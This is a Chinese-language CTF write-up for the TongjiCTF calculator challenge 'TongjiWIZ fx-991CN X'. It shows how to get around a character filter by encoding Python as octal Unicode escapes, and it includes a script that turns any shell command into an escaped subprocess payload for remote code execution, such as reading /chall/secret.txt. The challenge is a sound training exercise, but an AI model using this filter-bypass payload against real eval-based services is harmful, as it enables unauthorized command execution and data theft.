# TongjiWIZ fx-991CN X

## 题面

你说得对，但《TongjiWIZ fx-991CN X》是由 TongjiCTF 组委会自主研发的一款带 Unicode 输入功能但是却不支持 MathIO 的全新计算器（虽然能输中文但好像也没🔨用），比赛发生在一个被称作「同济大学」的幻想世界里，在这里，被神选中的人将被授予「参赛资格」，导引派森之力。你将扮演一位名为「挑战者」的神秘角色，在自由的旅行中解答性格各异、能力独特的挑战们，和你的计算器一起击败强敌，拿到失散的分数——同时，逐步发掘「无法计算，滚」的真相。

PS：源码会不做修改合并给出。

## 题解

看到反斜杠和 Unicode，只能数字和特定符号 -> 八进制 Unicode 表示
可以编写 ASCII 转八进制的脚本直接塞进去 RCE 得到 flag

```python
def ascii2octalstring(source: str) -> str:
    octal = ""
    for c in source:
            octal += "\\"
            octrep = oct(ord(c))[2:]  # octal numbers are prepended by a zero,
                                    # but since this will be a string not a
                                    # number we don't want that.
            octrep = octrep.zfill(3)  # pad with preceeding 0s
            octal += octrep
  
    return octal

if __name__ == '__main__':
    import io
    while True:
        cmd = input('cmd?\> ')
        # ls
        # cat /chall/secret.txt
        text = f'__import__("subprocess").check_output("{cmd}", shell=True)'
        print(text)
        result = ascii2octalstring(text)
        print(result)
        # a = eval(result.encode().decode('unicode_escape'))
        # print(a)
```
